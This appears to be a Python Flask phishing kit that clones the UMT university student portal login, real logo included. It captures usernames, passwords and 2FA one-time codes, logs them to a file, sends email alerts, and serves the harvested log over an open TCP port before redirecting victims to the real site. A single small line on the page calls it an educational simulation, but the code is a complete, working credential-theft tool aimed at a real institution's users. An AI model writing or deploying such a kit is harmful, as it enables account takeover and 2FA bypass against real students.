from flask import Flask, request, render_template_string, redirect, session
import smtplib  # For simulated email notifications
import socket
import threading
import datetime
import random
import os

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'  # Needed for session

# ===== CONFIGURATION =====
LOG_FILE = "umt_credentials_log.txt"
SMTP_SIMULATION = True  # Set False to disable email simulation
NOTIFICATION_EMAIL = "your_email@gmail.com"  # For simulated alerts

# ===== REALISTIC UMT LOGIN PAGE =====
UMT_LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>UMT Portal - Student Login</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        .logo { width: 150px; margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        .login-btn { background-color: #1a56a7; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; margin-top: 10px; }
        .login-btn:hover { background-color: #16478d; }
        .footer { margin-top: 20px; font-size: 12px; color: #777; }
        .warning { color: red; font-size: 10px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://umt.edu.pk/wp-content/uploads/2020/04/umt-logo-1.png" class="logo" alt="UMT Logo">
        <h3>Student Portal Login</h3>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Student ID/Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="login-btn">Login</button>
        </form>
        <div class="footer">
            <a href="#">Forgot password?</a> | <a href="#">Help Center</a>
        </div>
        <div class="warning">
            This is a simulated phishing demo for cybersecurity education purposes only.
        </div>
    </div>
</body>
</html>
"""

# ===== 2FA PAGE =====
TWO_FACTOR_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>UMT Portal - 2FA Verification</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        .logo { width: 150px; margin-bottom: 20px; }
        input[type="text"] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        .verify-btn { background-color: #1a56a7; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; margin-top: 10px; }
        .verify-btn:hover { background-color: #16478d; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://umt.edu.pk/wp-content/uploads/2020/04/umt-logo-1.png" class="logo" alt="UMT Logo">
        <h3>Two-Factor Authentication</h3>
        <p>We've sent a 6-digit code to your registered device</p>
        <form method="POST" action="/verify_2fa">
            <input type="text" name="otp" placeholder="Enter 6-digit code" required>
            <button type="submit" class="verify-btn">Verify</button>
        </form>
    </div>
</body>
</html>
"""

# ===== LOGGING FUNCTIONS =====
def log_credentials(data):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] {data}\n")

def simulate_email_notification(message):
    if SMTP_SIMULATION:
        try:
            with smtplib.SMTP("localhost", 1025) as server:  # Use MailHog for testing
                server.sendmail("phish_sim@umt.edu", NOTIFICATION_EMAIL, message)
        except:
            log_credentials(f"[!] Email simulation failed: {message}")

# ===== FLASK ROUTES =====
@app.route('/')
def home():
    return render_template_string(UMT_LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    
    # Store in session for 2FA
    session['username'] = username
    session['password'] = password
    session['ip'] = ip
    
    log_credentials(f"PHASE1 - LOGIN ATTEMPT | IP: {ip} | Username: {username} | Password: {password}")
    simulate_email_notification(f"New login attempt from {ip}\nUsername: {username}")
    
    return render_template_string(TWO_FACTOR_PAGE)

@app.route('/verify_2fa', methods=['POST'])
def verify_2fa():
    otp = request.form.get('otp')
    username = session.get('username', 'N/A')
    ip = session.get('ip', 'N/A')
    
    log_credentials(f"PHASE2 - 2FA ATTEMPT | IP: {ip} | Username: {username} | OTP: {otp}")
    simulate_email_notification(f"2FA attempt from {ip}\nUsername: {username}\nOTP: {otp}")
    
    return redirect("https://umt.edu.pk")

# ===== LOG VIEWER SERVER =====
def log_viewer_server():
    host = '0.0.0.0'
    port = 12345
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(f"[*] Log viewer running at {host}:{port}")
        while True:
            conn, addr = s.accept()
            with conn:
                with open(LOG_FILE, "r") as f:
                    logs = f.read()
                conn.sendall(logs.encode())

if __name__ == "__main__":
    # Clear previous logs
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    
    # Start Flask in thread
    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000))
    flask_thread.daemon = True
    flask_thread.start()
    
    # Start log viewer
    log_viewer_server()